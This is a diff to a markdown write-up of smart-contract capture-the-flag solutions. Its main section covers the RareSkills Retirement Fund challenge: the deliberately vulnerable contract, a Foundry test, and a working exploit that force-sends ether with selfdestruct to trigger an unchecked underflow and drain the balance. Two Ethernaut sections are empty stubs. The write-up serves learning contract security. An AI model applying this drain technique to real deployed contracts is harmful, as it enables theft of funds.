@@ -665,5 +665,130 @@ The exploit lies in the `blockhash` function. From the official Solidity documen
 
 Since `lockInGuess` in the `PredictTheBlockhash` contract has no restrictions on the input value, we can intentionally set the hash to `blockhash(0)` which returns `0x00`. If this was called at block number 1, then the `settlementBlockNumber` will be 2 since `settlementBlockNumber = block.number + 1`, and `answer` will be `blockhash(2)`. So in this example, we just have to call `settle` at block number 259 and beyond, where `blockhash(2)` will return `0x00` since its out of the most recent 256 blocks. So long as we call `settle` at `blockNumber + 258`, it will work for any block number.
 
+## Capture the Ether Foundry (RareSkills): Retirement Fund
+Link: https://github.com/RareSkills/capture-the-ether-foundry/tree/master/RetirementFund
 
+### Contracts
+- `src/Week8-9/RetirementFund.sol`
+```
+contract RetirementFund {
+    uint256 startBalance;
+    address owner = msg.sender;
+    address beneficiary;
+    uint256 expiration = block.timestamp + 520 weeks;
 
+    constructor(address player) payable {
+        require(msg.value == 1 ether);
+
+        beneficiary = player;
+        startBalance = msg.value;
+    }
+
+    function isComplete() public view returns (bool) {
+        return address(this).balance == 0;
+    }
+
+    function withdraw() public {
+        require(msg.sender == owner);
+
+        if (block.timestamp < expiration) {
+            // early withdrawal incurs a 10% penalty
+            (bool ok,) = msg.sender.call{value: (address(this).balance * 9) / 10}("");
+            require(ok, "Transfer to msg.sender failed");
+        } else {
+            (bool ok,) = msg.sender.call{value: address(this).balance}("");
+            require(ok, "Transfer to msg.sender failed");
+        }
+    }
+
+    function collectPenalty() public {
+        require(msg.sender == beneficiary);
+        uint256 withdrawn = 0;
+        unchecked {
+            withdrawn += startBalance - address(this).balance;
+
+            // an early withdrawal occurred
+            require(withdrawn > 0);
+        }
+
+        // penalty is what's left
+        (bool ok,) = msg.sender.call{value: address(this).balance}("");
+        require(ok, "Transfer to msg.sender failed");
+    }
+}
+
+// Write your exploit contract below
+contract ExploitContract {
+    RetirementFund public retirementFund;
+
+    constructor(RetirementFund _retirementFund) {
+        retirementFund = _retirementFund;
+    }
+
+    // write your exploit functions below
+    function forceSendEther() public {
+        selfdestruct(payable(address(retirementFund)));
+    }
+}
+```
+- `test/Week8-9/RetirementFund.t.sol`
+```
+contract RetirementFundTest is Test {
+    RetirementFund public retirementFund;
+    ExploitContract public exploitContract;
+
+    function setUp() public {
+        // Deploy contracts
+        retirementFund = (new RetirementFund){value: 1 ether}(address(this));
+        exploitContract = new ExploitContract(retirementFund);
+    }
+
+    function testIncrement() public {
+        vm.deal(address(exploitContract), 1 ether);
+        // Test your Exploit Contract below
+        // Use the instance retirementFund and exploitContract
+
+        // Put your solution here
+        exploitContract.forceSendEther();
+        retirementFund.collectPenalty();
+        _checkSolved();
+    }
+
+    function _checkSolved() internal {
+        assertTrue(retirementFund.isComplete(), "Challenge Incomplete");
+    }
+
+    receive() external payable {}
+}
+```
+
+### Exploit
+When `RetirementFund` is deployed in `RetirementFundTest`, both the `owner`` and `beneficiary`` of `RetirementFund` are the address of the `RetirementFundTest` contract. The `startBalance` of the victim contract becomes `1 ether`, and the balance of the victim contract also becomes `1 ether`.
+
+The vulnerability is in the `collectPenalty` function, where there is an unchecked block. In order for `collectPenalty` to successfully transfer its balance to msg.sender, `withdrawn` needs to be more than 0. If we call `collectPenalty` right away, the require statement will cause the call to fail as `withdrawn` will only be 0 (`startBalance == 1` & `address(this).balance == 1`). Since we cant increment `startBalance`, the only way to make `withdrawn` more than 0 is to cause an underflow in the unchecked block. By getting `address(this).balance` to be any number slighlty over 1, the unchecked block will cause `withdrawn` to increment by an extremely large number, as `startBalance - address(this).balance` will wrap around 0.
+
+Note that `RetirementFund` does not have a `receive` function, neither does it have a `fallback` function, or even a `payable` function. So the contract seemingly cannot receive any more ether. We can, however, use `selfdestruct` to forcefully send ether to the `RetirementFund` contract by calling `selfdestruct` and specifying `RetirementFund` as the target.
+
+Thus for the exploit to work, we deploy `ExploitContract` and deal it with 1 ether. Then call `forceSendEther` which calls `selfdestruct` with `RetirementFund` as the target, and this forcefully sends the balance of `ExploitContract` to `RetirementFund`. The values of `startBalance` and `address(this).balance` in the victim contract will be 1 and 2 respectively, and now `require(withdrawn > 0)` will pass when `collectPenalty` is called because the underflow will occur in `startBalance - address(this).balance`. The end result will be the transfer of `RetirementFund`'s entire balance to msg.sender.
+
+## Ethernaut: #15 Naught Coin
+Link: https://ethernaut.openzeppelin.com/level/0x80934BE6B8B872B364b470Ca30EaAd8AEAC4f63F
+
+### Contracts
+- `src/Week8-9/Ethernaut_NaughtCoin.sol`
+```
+```
+- `test/Week8-9/Ethernaur_NaughtCoin.t.sol`
+
+### Exploit
+
+## Ethernaut: #20 Denial
+Link: https://ethernaut.openzeppelin.com/level/0x2427aF06f748A6adb651aCaB0cA8FbC7EaF802e6
+
+### Contracts
+- `src/Week8-9/Ethernaut_Denial.sol`
+```
+```
+- `test/Week8-9/Ethernaur_Denial.t.sol`
+
+### Exploit
